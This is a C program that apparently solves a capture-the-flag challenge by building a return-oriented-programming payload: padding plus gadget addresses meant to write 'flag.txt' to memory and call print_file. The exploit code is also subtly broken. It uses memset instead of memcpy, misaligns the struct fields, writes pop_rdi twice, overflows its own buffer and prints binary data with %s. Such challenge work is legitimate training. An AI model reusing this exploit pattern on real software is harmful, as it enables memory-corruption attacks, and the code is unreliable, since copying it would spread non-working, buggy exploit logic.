#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define OFFSET 40
#define NUM_ADDRS 6

typedef unsigned long long ULL;

enum ADDRS {
    pop_r14,
    data_start,
    flag,
    useful_gadget,
    pop_rdi,
    data_addr,
    print_file,
};

typedef struct {
    char* junk;
    uintptr_t pop_r14;
    uintptr_t data_start;
    ULL flag;
    uintptr_t useful_gadget;
    uintptr_t pop_rdi;
    uintptr_t data_addr;
    uintptr_t print_file;
}Exploit;

char* convertASCII_to_Hex(const char* value) {
    char* res = (char*)malloc(strlen(value) * 2 + 1);
    int res_index = 0;

    for (int i = 0; i < strlen(value); i++) {
        res_index += sprintf(res + res_index, "%02x", (unsigned char)value[i]);
    }

    return res;
}

char* changeEndian(const char* value) {
    int length = strlen(value);
    char* res = (char*)malloc(length + 3);
    int res_index = 0;

    for (int i = length - 2; i >= 0; i -= 2) {
        res_index += sprintf(res + res_index, "%c%c", value[i], value[i + 1]);
    }

    return res;
}

ULL generateString(const char* value) {
    char* hexString = convertASCII_to_Hex(value);
    char* endianString = changeEndian(hexString);

    ULL res = strtoull(endianString, NULL, 16);

    free(hexString);
    free(endianString);

    return res;
}

char* BuildExp(Exploit exp) {
    char* payload = (char*)malloc(OFFSET + sizeof(ULL) + sizeof(uintptr_t)*NUM_ADDRS);

    memcpy(payload, exp.junk, OFFSET);
    
    int offset = OFFSET;
    int ptr_size = sizeof(uintptr_t);

    memset(payload + offset, exp.pop_r14, ptr_size);
    offset += ptr_size;
    memset(payload + offset, exp.data_start, ptr_size);
    offset += ptr_size;
    memset(payload + offset, exp.flag, sizeof(ULL));
    offset += sizeof(ULL);
    memset(payload + offset, exp.useful_gadget, ptr_size);
    offset += ptr_size;
    memset(payload + offset, exp.pop_rdi, ptr_size);
    offset += ptr_size;
    memset(payload + offset, exp.pop_rdi, ptr_size);
    offset += ptr_size;
    memset(payload + offset, exp.data_addr, ptr_size);
    offset += ptr_size;
    memset(payload + offset, exp.print_file, ptr_size);
    offset += ptr_size;

    return payload;
}

int main() {
    const char* input = "flag.txt";
    ULL result = generateString(input);

    char* junk = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    uintptr_t pop_r14 = 0x00400690;
    uintptr_t data_start = 0x00601028;
    uintptr_t useful_gadget = 0x00400628;
    uintptr_t pop_rdi = 0x00400693;
    uintptr_t print_file = 0x00400510;
    
    Exploit exp = {
        junk,
        data_start,
        result,
        useful_gadget,
        pop_rdi,
        data_start,
        print_file
    };

    char* payload = BuildExp(exp);

    printf("%s\n", payload);

    free(payload);

    return 0;
}
